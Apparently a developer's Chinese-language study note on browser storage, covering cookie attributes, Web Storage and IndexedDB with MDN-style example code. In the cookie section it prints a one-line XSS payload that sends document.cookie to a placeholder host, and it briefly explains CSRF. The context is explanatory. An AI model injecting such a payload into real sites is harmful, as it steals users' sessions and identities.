
# cookie
目的： 用于识别用户身份。  
特点： 
* 4kb
* 发请求自动带上
原理： 服务器返回setsCookie时，浏览器会记住cookie, 浏览器发送请求，cookie会被携带给服务器。  
Cookie 执行同源策略，同一个 host 下的不同端口可以互相访问 Cookie。a与b只能访问自己的cookie，在a中内嵌c网页，并获取c的cookie，此时c cookie是a的第三方cookie。
** Chrome 更新 80后， SameSite 为`Lax`， 仅允许同站或者子站访问Cookie, 跨站（内嵌c无法访问cookie）需要SameSite `None` **
Secure：只允许Https setCookie
HttpOnly： 不允许JS访问ducoment.cookie， 只能由服务器setsCookie
```
Set-Cookie: userId=123; SameSite=None; Secure; HttpOnly
```
应用： 多用于广告服务。a通过内嵌网页向c发送请求，c返回cookie；b通过内嵌网页向c发送请求，并携带cookie，c获知用户身份，按喜好投放广告。 
缺点： 
XSS攻击： 跨站脚本攻击， 利用用户对网页的信任。不设置HttpOnly，则用户能上传恶意代码，如： `<script>window.open("举个栗子.com?cookie=" + document.cookie</script>`，获取他人的cookie与身份。
CSRF(Cross-site request forgery): 跨站请求伪造，需要诱导点击，利用<form>跨域发请求，携带cookie，完成非意愿的操作。

# storage
目的：弥补cookie太小
特点：
* 10MB
* 使用 Key-Value 形式储存， 只能存字符串。
* 需要调用setItem, getItem, removeItem, clear。
* 增删改查为同步。

# IndexedDB
目的：弥补storage只能存字符串
特点：
* 空间无限制。
* 能存对象，数字等。
* 增删改查都是异步。
[文档] (https://developer.mozilla.org/zh-CN/docs/Web/API/IndexedDB_API/Using_IndexedDB)

IndexedDB 鼓励使用的基本模式如下所示：

```

1. 打开数据库。
2. 在数据库中创建一个对象仓库（object store）。
3. 启动一个事务，并发送一个请求来执行一些数据库操作，像增加或提取数据等。
4. 通过监听正确类型的 DOM 事件以等待操作完成。
5. 在操作结果上进行一些操作


const dbName = "the_name";

var request = indexedDB.open(dbName, 2);

request.onerror = function(event) {
  // 错误处理
};
request.onsuccess = function(event) {
// 成功
  console.log(event.target.result)
};

// 当你创建一个新的数据库或者增加已存在的数据库的版本号（当打开数据库时，指定一个比之前更大的版本号）， onupgradeneeded 事件会被触发, onupgradeneeded 是我们唯一可以修改数据库结构的地方。
request.onupgradeneeded = function(event) {
  var db = event.target.result;

  // 建立一个对象仓库来存储我们客户的相关信息，我们选择 ssn 作为键路径（key path）
  // 因为 ssn 可以保证是不重复的
  // autoIncrement 自增
  var objectStore = db.createObjectStore("customers", { keyPath: "ssn", autoIncrement : true });

  // 建立一个索引来通过姓名来搜索客户。名字可能会重复，所以我们不能使用 unique 索引
  objectStore.createIndex("name", "name", { unique: false });

  // 使用邮箱建立索引，我们向确保客户的邮箱不会重复，所以我们使用 unique 索引
  objectStore.createIndex("email", "email", { unique: true });

  // 使用事务的 oncomplete 事件确保在插入数据前对象仓库已经创建完毕
  objectStore.transaction.oncomplete = function(event) {
    // 将数据保存到新创建的对象仓库
    var customerObjectStore = db.transaction("customers", "readwrite").objectStore("customers");
    // 增
    customerData.forEach(function(customer) {
      let add = customerObjectStore.add(customer);
      add.onsuccess = () => {}
      add.onerror = () => {} 
    });
    // 改
    let put = customerObjectStore.put(data)
    put.onsuccess = () => {}
    put.onerror = () => {} 
    // 删
    let remove = customerObjectStore.delete("444-44-4444")
    remove.onsuccess = () => {}
    remove.onerror = () => {} 
    // 查
    let get = customerObjectStore.get("444-44-4444")
    get.onsuccess = () => {}
    get.onerror = () => {} 
  };
};

```
